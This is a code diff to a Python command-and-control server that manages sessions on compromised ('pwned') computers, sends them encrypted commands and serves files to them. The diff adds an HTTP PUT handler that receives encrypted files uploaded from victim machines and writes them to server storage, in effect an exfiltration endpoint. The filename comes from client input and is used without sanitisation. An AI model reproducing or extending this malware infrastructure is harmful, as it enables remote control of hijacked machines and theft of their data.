@@ -5,7 +5,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
 from encryption import cipher
-from settings import FILE_REQUEST, CWD_RESPONSE, PORT, CMD_REQUEST, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR
+from settings import FILE_REQUEST, CWD_RESPONSE, FILE_SEND, PORT, CMD_REQUEST, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR, STORAGE
 
 def get_new_session():
     """ Function to check if other sessions exist. If none do, re-initialize variables. However, if session do
@@ -20,6 +20,8 @@ def get_new_session():
     # If dictionary is empty, re-initialize variables to their starting values
     if not pwned_dict:
         print("Waiting for new connections.\n")
+        pwned_id = 0
+        active_session = 1
     else:
         # Display sessions in our dictionary and choose one of them to switch over to
         while True:
@@ -112,10 +114,10 @@ class C2Handler(BaseHTTPRequestHandler):
                 except BrokenPipeError:
                     print(f"{client_account}@{client_hostname} has disconnected!\n")
                     get_new_session()
-
-                # If we have just killed a client, try to get a new session to set active
-                if command.startswith("client kill"):
-                    get_new_session()
+                else:
+                    # If we have just killed a client, try to get a new session to set active
+                    if command.startswith("client kill"):
+                        get_new_session()
 
             # The client is in pwned_dict, but it is not our active session:
             else:
@@ -139,7 +141,11 @@ class C2Handler(BaseHTTPRequestHandler):
                     self.wfile.write(cipher.encrypt(file_handle.read()))
             except (FileNotFoundError, OSError):
                 print(f"{filepath} was not found on the c2 server.")
-                self.http_response(404) 
+                self.http_response(404)
+
+        # Nobody should ever be accessing to our c2 server using HTTP GET other than to the above paths
+        else:
+            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP GET. Why?\n")
 
     # noinspection PyPep8Naming
     def do_POST(self):
@@ -157,7 +163,46 @@ class C2Handler(BaseHTTPRequestHandler):
 
         # Nobody should ever be posting to our c2 server other than to the above paths
         else:
-            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server. Why?\n")
+            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP POST. Why?\n")
+
+
+    def do_PUT(self):
+        """ This method handles all HTTP PUT requests that arrive at the c2 server. """
+
+        # Follow this code block when the compromised computer is sending the server a file
+        if self.path.startswith(FILE_SEND + "/"):
+            self.http_response(200)
+
+            # Split out the encrypted filename from the HTTP PUT request
+            filename = self.path.split(FILE_SEND + "/")[1]
+
+            print("filename before decryption", filename)
+
+            # Encode the filename because decrypt requires it, then decrypt, then decode
+            filename = cipher.decrypt(filename.encode()).decode()
+
+            print("filename after decryption", filename)
+
+            # This adds the file name to our storage path
+            incoming_file = STORAGE + "/" + filename
+
+            print(incoming_file)
+
+            # We need the content length to properly read in the file
+            file_length = int(self.headers["Content-Length"])
+
+            # Zero byte files cant't be transferred in
+            if file_length is None:
+                print(f"{incoming_file} has no data. Abording transfer.")
+            else:
+                # Read the stream coming from our client. decrypt and write the file out to disk
+                with open(incoming_file, "wb") as file_handle:
+                    file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
+
+        # Nobody should ever be accessing to our c2 server using HTTP PUT
+        else:
+            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP PUT. Why?\n")
+
 
 
     def handle_post_data(self):
